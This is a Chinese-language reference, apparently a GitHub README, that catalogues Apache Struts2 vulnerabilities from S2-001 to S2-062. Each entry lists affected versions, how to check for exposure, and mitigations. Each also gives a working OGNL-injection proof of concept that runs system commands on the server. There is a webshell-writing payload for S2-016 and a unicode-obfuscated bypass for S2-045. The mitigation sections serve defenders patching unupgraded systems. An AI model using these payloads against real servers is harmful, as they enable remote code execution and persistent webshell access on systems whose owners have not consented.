# Java框架及组件漏洞
Java框架及组件漏洞POC , 以及部分经验证的官方推荐的缓解措施，便于不升级组件情况下阻止漏洞。
缓解措施仅用于缓解漏洞影响，可能对系统存在未知影响；建议先评估再使用，并在配置后跑全流程回归，避免因更改配置对系统造成影响。


# **S2-001**

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.0.8

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中，排查使用OGNL表达式的代码段



- #### 漏洞利用

  ##### 获取 Tomcat 执行路径：

  ```java
  %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
  ```

  ##### 获取Web路径：

  ```java
  %{ #req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #response.println(#req.getRealPath('/')), #response.flush(), #response.close() }
  ```

  

  ##### 命令执行：

  ```java
  %{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(),#f.getWriter().close() }
  ```
  

- #### 缓解措施



struts.xml或struts.properties中关闭altSyntax，不强制解析OGNL表达式
![image-20220421142737840](https://user-images.githubusercontent.com/33454436/165062610-fcf71a21-6ae6-4cf7-8d95-a6c74899ed2d.png)

------

# S2-005

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.1.8.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中，排查使用OGNL表达式的代码段

- #### 漏洞利用

  **命令执行：**

  ```java
  ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
  ```

  

- #### 缓解措施

- https://cwiki.apache.org/confluence/display/WW/S2-005

  ```xml
  <interceptor-ref name="params">
                  <param name="excludeParams">dojo\..*,^struts\..*,.*\\.*,.*\(.*,.*\).*,.*@.*</param>
  </interceptor-ref>
  ```

  strut.xml中增加拦截器

![image-20220421145415172](https://user-images.githubusercontent.com/33454436/165062710-e387aa03-aa8d-4d83-b0e4-ab3fc1eba934.png)

------

# S2-009

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.3.1.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中，排查使用OGNL表达式的代码段

- #### 漏洞利用

  ###### 命令执行：验证环境2.0.11.2；2.0.6未成功

```java
(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('calc.exe'))(meh)&z[(这个是参数名，如id)('meh')]=true
```

- #### 缓解措施

```java
2.0.11.2环境实验，005的正则可以规避漏洞，官方给出的009正则不能正确过滤；考虑应该是版本问题

005正则
<interceptor-ref name="params">
 <param name="excludeParams">dojo\..*,^struts\..*,.*\\.*,.*\(.*,.*\).*,.*@.*</param>
</interceptor-ref>


009正则
<interceptor-ref name="params">
<param name="acceptParamNames">\w+((\.\w+)|(\[\d+\])|(\['\w+'\]))*</param>
</interceptor-ref>
```

------



# S2-013

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.3.14.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中，重点关注是否存在如下标签设置：

  ```java
  <s:a id="id" action="DemoT" includeParams="all">"s:a" tag</s:a>
  <s:url id="id" action="DemoX" includeParams="get">"s:url" tag</s:url>
  
  使用s:url/s:a标签，且配置了includeParams属性为all/get
  ```

  

- #### 漏洞利用

  ###### 命令执行

  ```java
  ${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(+new java.lang.String(#d)),#out.close()}
  ```

  

- #### 缓解措施

  ###### 升级组件至安全版本，不将includeParams配置为all或get

------

# S2-016

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.3.15

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中

- #### 漏洞利用

  可能存在其他变体poc

  ###### 命令执行

  ```java
  redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
  ```

  ###### 目录读取

  ```java
  redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}
  ```

  ###### webshell

  ```java
  redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath("/")).append(@java.io.File@separator).append("1.jspx").toString()),#b.write(#a.getParameter("t").getBytes()),#b.close(),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println("BINGO"),#genxor.flush(),#genxor.close()}
  ```

  ###### S2-017重定向漏洞

  ```java
  http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23
  http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/
  ```

  

- #### 缓解措施

  官方暂无缓解措施，只能通过升级规避漏洞，且与S2-017相同，通过redirect:/redirectAction:实现重定向漏洞。**新版本DefaultActionMapper 已更改为完全删除与“redirect:”/“redirectAction:”-前缀参数有关的功能**。

------

# S2-devMode

- #### 影响版本

  ###### 2.1.0及以上，高版本需要手工绕沙盒

- #### 安全版本

  ######  不要开启devMode

- #### 排查方法

  ###### 排查struts.xml或struts.properties文件，查看devMode属性是否为true

- #### 漏洞利用

  ###### 探测：

  ```
  debug=xml
  ```

  ###### 命令执行：

  ```java
  debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath888888&command=whoami
  ```

- #### 缓解措施

  ###### 不开启devMode

 ![image-20220424005310379](https://user-images.githubusercontent.com/33454436/165062850-801e0e3d-d9fe-4670-91c6-2a55448fbbe7.png)


------

# S2-019

- #### 影响版本

  ######  Struts 2.0.0 - Struts 2.3.15.1

- #### 安全版本

  ###### 2.5.30（2.3.15.2之后默认不开启DynamicMethodInvocation，但涉及其他漏洞）

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中，或高版本的组件是否配置struts.enable.DynamicMethodInvocation为true

- #### 漏洞利用

  ###### 命令执行：

  ```java
  debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23dis.close%28%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23msg%3D%23msg.trim%28%29
  ```

  

- #### 缓解措施

  ###### 在struts.xml或struts.properties中进行如下配置：

![image-20220424115319188](https://user-images.githubusercontent.com/33454436/165062885-383aa560-6165-4607-8558-097f6a3704db.png)

------

# S2-032

- #### 影响版本

  ###### Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3 和 2.3.24.3 除外）

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中且是否配置struts.enable.DynamicMethodInvocation为true

- #### 漏洞利用

  ###### 命令执行：

  ```java
  method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString=&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=calc
  ```

- #### 缓解措施

  ###### 在struts.xml或struts.properties中进行如下配置：与S2-019可用相同配置

![image-20220424115319188](https://user-images.githubusercontent.com/33454436/165063660-72615a31-a6d3-4c36-91be-cc0df4d6bd65.png)


------

# S2-037

- #### 影响版本

  ###### Struts 2.3.20 - Struts Struts 2.3.28.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中且是否使用rest插件

- #### 漏洞利用

  ###### 命令执行：

  ```java
  %28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=ls
  ```

- #### 缓解措施

  无，建议升级至安全版本。

  ------

# S2-045

- #### 影响版本

  ###### Struts 2.3.5 - Struts 2.3.31，Struts 2.5 - Struts 2.5.10

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 检查lib目录或pom中的struts2组件版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```java
  一、
  Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='calc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
  ```

  ```
  二、bypass
  smultipart/form-data%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#req=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletRequest')).(#hh=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletResp\u006fnse')).(#\u006fsname=@java.lang.System@getPr\u006fperty('\u006fs.name')).(#list=#\u006fsname.startsWith('Wind\u006fws')?{'cmd.exe','/c','whoami'}:{'/bin/bash','-c','whoami'}).(#aa=(new java.lang.Pr\u006fcessBuilder(#list)).start()).(#bb=#aa.getInputStream()).(#hh.getWriter().println(new java.lang.String(new \u006frg.apache.c\u006fmm\u006fns.i\u006f.IOUtils().t\u006fByte\u0041rray(#bb),'GB2312'))?true:true).(#hh.getWriter().flush()).(#hh.getWriter().cl\u006fse())}
  ```

  

- #### 缓解措施

  换个解析器，但这个2.3.18版本及之后才有；不能升级就加过滤器，详见：https://cwiki.apache.org/confluence/display/WW/S2-045

  ![image-20220424154943122](https://user-images.githubusercontent.com/33454436/165063813-f9c348f5-8311-48eb-bb64-12e35a49c6dc.png)


  ![image-20220424155452180](https://user-images.githubusercontent.com/33454436/165063823-fc439e60-6e05-495e-ae53-7ae2b8b7ca10.png)

------

# S2-046

- #### 影响版本

  ###### Struts 2.3.5 - Struts 2.3.31，Struts 2.5 - Struts 2.5.10

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  检查lib目录或pom中的struts2组件版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```java
  %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.b   
  
  b前面的 . 要截断 hex改00
  ```

- #### 缓解措施

  使用官方新增的两个解析器

  ```xml
  <bean type="org.apache.struts2.dispatcher.multipart.MultiPartRequest"
             class="org.apache.struts.extras.SecureJakartaStreamMultiPartRequest"
             name="secure-jakarta-stream"
             scope="default"/>
     
  <!-- when running Struts 2.3.8 use this constant name -->
  <constant name="struts.multipart.handler" value="secure-jakarta-stream"/>
  <!-- when running Struts 2.3.9 - 2.3.31 use this constant name -->
  <constant name="struts.multipart.parser" value="secure-jakarta-stream"/>
  ```

  是maven构建的加以下标签

  ```xml
  <dependency>
      <groupId>org.apache.struts</groupId>
      <artifactId>struts2-secure-jakarta-stream-multipart-parser-plugin</artifactId>
      <version>1.1</version>            
  </dependency>
  ```

  直接用jar包的

  http://search.maven.org/remotecontent?filepath=org/apache/struts/struts2-secure-jakarta-stream-multipart-parser-plugin/1.1/struts2-secure-jakarta-stream-multipart-parser-plugin-1.1.jar

  详见：

  https://github.com/apache/struts-extras

  https://cwiki.apache.org/confluence/display/WW/S2-046

------

# S2-048

- #### 影响版本

  ###### 使用struts1插件的struts2.3.X版本，struts 1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中是否存在struts2-struts1-plugin-2.x.x.jar,

  ###### 2、检查项目中使用部署showcase

- #### 漏洞利用

  ###### 命令执行：

  ```
  %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())).(#q)}
  ```

- #### 缓解措施

  ###### 1、不使用struts2-struts1-plugin-2.x.x.jar或升级struts版本

  ###### 2、不部署showcase,如需部署要修改SaveGangsterAction.java，示例如下：

![image-20220424220859218](https://user-images.githubusercontent.com/33454436/165063082-9701de91-e21d-4db2-9d12-6bc9be9ca443.png)


------

# S2-053

- #### 影响版本

  ###### Struts 2.0.0 - 2.3.33Struts 2.5 - Struts 2.5.10.1

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中；

  2、检查是否使用freemarker模板，如使用可查看ftl中是否存在如下结构表达式：

  ```java
  <@s.hidden name="redirectUri" value=redirectUri />
  <@s.hidden name="redirectUri" value="${redirectUri}" />
  <@s.hidden name="${redirectUri}"/>
  ```

- #### 漏洞利用

  ###### 命令执行：

  ```
  %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
  ```

  

- #### 缓解措施

  如果使用以下模板表达式：
![image-20220424235636379](https://user-images.githubusercontent.com/33454436/165063142-c1348cc4-61ff-4854-b475-fbb058e7a122.png)
  

  当Action中有getter、setter方法时，则触发漏洞，如下：

  ![image-20220424235758384](https://user-images.githubusercontent.com/33454436/165063175-cb329c25-ddd7-4775-991f-b71f4c080d82.png)


  当Action中只有getter时，不触发该漏洞，如下：

![image-20220424235834946](https://user-images.githubusercontent.com/33454436/165063189-057041ca-b58d-4aeb-b865-5c251d6b4825.png)


官方未提供缓解措施。不要使用存在漏洞的表达式结果，或升级至安全版本解决漏洞。

------

# S2-057

- #### 影响版本

  ###### Struts 2.0.4 - Struts 2.3.34、Struts 2.5.0 - Struts 2.5.16

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中；

  ###### 2、检查struts.xml中的package标签以及result标签中的param标签是否没有配置namespace或使用通配符进行配置

- #### 漏洞利用

  ###### 命令执行：

  ```java
  ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('whoami')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
  ```

  

- #### 缓解措施

  固定package标签页以及result的param标签页的namespace值，以及禁止使用通配符。

  ![image-20220425102855944](https://user-images.githubusercontent.com/33454436/165063240-687b8a25-6439-4016-8d3a-7aa8f332917e.png)


------

# S2-061

- #### 影响版本

  ######  Struts 2.0.0 - Struts 2.5.25

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中

  ###### 2、检查JSP中是否存在将用户输入数据未经过滤直接使用表达式解析

- #### 漏洞利用

  ###### 命令执行：

  ```java
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
  Content-Length: 829
  
  ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
  Content-Disposition: form-data; name="id"
  
  %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
  ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
  ```

  

- #### 缓解措施

  通过struts.ognl.expressionMaxLength限制表达式长度，这个要结合实际功能使用，避免因配置导致正常功能无法使用。

  ![image-20220425130022300](https://user-images.githubusercontent.com/33454436/165063270-89851856-70ad-48c2-ba39-b862aad31bee.png)


  当收到OGNL注入时候，会因表达式长度受限而抛出异常

  ![image-20220425130128103](https://user-images.githubusercontent.com/33454436/165063280-56b92cf2-dabb-47e3-8880-5ded0b2841e3.png)


------

# S2-062

- #### 影响版本

  ###### Struts 2.0.0 - Struts 2.5.29

- #### 安全版本

  ###### 2.5.30

- #### 排查方法

  ###### 1、检查lib目录或pom中的struts2组件版本是否在漏洞版本中

  ###### 2、检查JSP中是否存在将用户输入数据未经过滤直接使用表达式解析

- #### 漏洞利用

  ###### 命令执行：

  ```
  与061一样，也是multipart提交
  
  %{
  (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc'}))}
  ```

  

- #### 缓解措施

  见s2-061
